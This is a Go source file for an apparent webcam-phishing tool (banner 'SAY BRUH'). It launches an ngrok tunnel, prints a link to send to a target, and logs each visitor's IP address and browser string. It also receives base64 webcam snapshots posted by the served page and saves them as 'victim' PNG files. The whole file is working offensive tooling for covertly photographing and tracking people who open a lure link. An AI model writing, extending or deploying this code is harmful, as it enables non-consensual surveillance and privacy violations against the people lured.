package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strings"
	"syscall"
	"time"
)

var (
	cono        int            = 0                                                  // this is for avoid problems
	detectNgrok *regexp.Regexp = regexp.MustCompile("https://+[a-z0-9]+.ngrok.io") // this is the regex for get the url

	logo string = "" +
		"                                                              \033[36m     GGGGGGGG          \n" +
		"                                                                 GlGGGGGG1GGG        \n" +
		"                                                                GGG\033[37m@@@|G1\033[37m@@@\033[36m11GG     \n" +
		"                                                                l1\033[37m|:@@@G\033[37m@ @@\033[36m0GlG     \n" +
		"                                                                GG\033[37m| @@@G\033[37m@ @@\033[36m1G1      \n" +
		"                                                                 G\033[37mG@@@| \033[37m!@@\033[36mGGGG      \n" +
		"                                                                :GGGGGG!GlGGGGG      \n" +
		"                                                                :GGGGG11||GGGGG      \n" +
		"                                                                :GGGGG1\033[37m@@\033[36mGGGGGG   \n" +
		"                                                                .GGGGGGGGGGGGGG      \n" +
		"                                                                 GGGGGGGGGGGGGG      \n" +
		"                                                                 GGGGGGGGGGGGGG      \n" +
		"                                                                1GGGGGGGGGGGGGGG     \n" +
		"                                                               l|GGGGGGGGGGGGGG|!    \n" +
		"                                                                 GGGGGGGGGGGGGG      \n" +
		"                                                                 GGGGGGGGGGGGGG      \n" +
		"                                                                .GGGGGGGGGGGGGG      \n" +
		"                                                                .GGGGGGGGGGGGGG      \n" + "███████╗ █████╗ ██╗   ██╗    ██████╗ ██████╗ ██╗   ██╗██╗  ██╗" +
		"  .GGGGGGGGGGGGGG      \n" + "██╔════╝██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔══██╗██║   ██║██║  ██║" +
		"   GGGGGGGGGGGGGG      \n" + "███████╗███████║ ╚████╔╝     ██████╔╝██████╔╝██║   ██║███████║" +
		"   GGGGGGGGGGGGGG      \n" + "╚════██║██╔══██║  ╚██╔╝      ██╔══██╗██╔══██╗██║   ██║██╔══██║" +
		"   |GGGGGGGGGGGG       \n" + "███████║██║  ██║   ██║       ██████╔╝██║  ██║╚██████╔╝██║  ██║" +
		"     GGGGGGGGGGl        \n" + "╚══════╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝" +
		"   00:1G  GGG| 0|      \n"
)

type photo struct {
	Photo string `json:"img"`
}

func imagePNG(input string) io.Reader {
	return base64.NewDecoder(base64.StdEncoding, strings.NewReader(input))
}


func saycheese(_ http.ResponseWriter, r *http.Request) {
	log.Println("\nNew photo")
	// decode the bodyrequest
	var conf photo

	json.NewDecoder(r.Body).Decode(&conf)

	// decode the base64
	imageData := imagePNG(strings.Replace(conf.Photo, "data:image/octet-stream;base64,", "", 1))

	// decode the image
	im, err := png.Decode(imageData)
	if err != nil {
		log.Println(err)
		return
	}
	//create the archive

	archiveName := fmt.Sprintf("images/victim%s.png", time.Now())
	fs, err := os.Create(archiveName)
	if err != nil {
		os.Mkdir("images", 0700)
		fs, _ = os.Create(archiveName)

	}
	defer fs.Close()
	//save the archive
	png.Encode(fs, im)

}
func writeIP(w http.ResponseWriter, r *http.Request) {
	// create or open the file
	fs, err := ioutil.ReadFile("logs.txt")
	if err != nil {

		_, err := os.Create("logs.txt")
		if err != nil {
			fmt.Println(err)
		}
	}
	//add more info to
	after := string(fs)
	//join the data
	output := strings.Join([]string{after, r.Header.Get("x-forwarded-for"), r.Header.Get("User-Agent")}, "\n")
	log.Printf("%s visit your page", r.Header.Get("x-forwarded-for"))
	err = ioutil.WriteFile("logs.txt", []byte(output), 0644)
	// send the pages
	http.ServeFile(w, r, "view"+r.URL.Path)
}
func sayNgrok() {
	// wait a second

	time.Sleep(time.Second*1) // make the petition

	res, err := http.Get("http://127.0.0.1:4040/api/tunnels")
	if err != nil && cono <= 10 {
		// this is shit
		cono++
		sayNgrok()

	} else if cono > 10 {
		fmt.Println("I need ngrok!, if you don't have ngrok, try `sudo apt install ngrok`")
		return
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		// if this doesnt find the url you need to contact us
		fmt.Println("url dont find")
		return
	}

	// then send you  something like this  https://254ff7ccf60c.ngrok.io

	fmt.Printf("\nsend \033[36m%s\n\n\033[0m", detectNgrok.FindString(string(body)))
}

func main() {
	// clear the console
	var out []byte
	out, err := exec.Command("clear").Output()
	if err != nil {
		out, _ = exec.Command("cls").Output()
	}
	fmt.Println(out)
	// start the interface
	fmt.Printf("\033[35m%s\n\033[0m", logo)
	fmt.Println("\033[34mstarting  server \033[0m")
	/// some stuff for do this work
	cmd:= exec.Command("./ngrok", "http", "8080")
	go func() {
		// ejecuta el comando para ejecutar ngrok
		fmt.Println("I need ngrok!, if you don't have ngrok, try `sudo apt install ngrok`")
		if err := cmd.Run(); err != nil {
			cmd = exec.Command("ngrok", "http", "8080")
			if err := cmd.Run(); err != nil {
				log.Println(err)
				//fmt.Println("\033[31minstall ngrok for use this\033[0m")
			}	
		}	
	}()
	// stop the process
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func(){
		<-c
		if err := cmd.Process.Kill(); err != nil {
			log.Println(err.Error())
		}
		os.Exit(0)
	}()
	sayNgrok()
	http.HandleFunc("/", writeIP)
	http.HandleFunc("/photo", saycheese)
	http.ListenAndServe(":8080", nil)
}
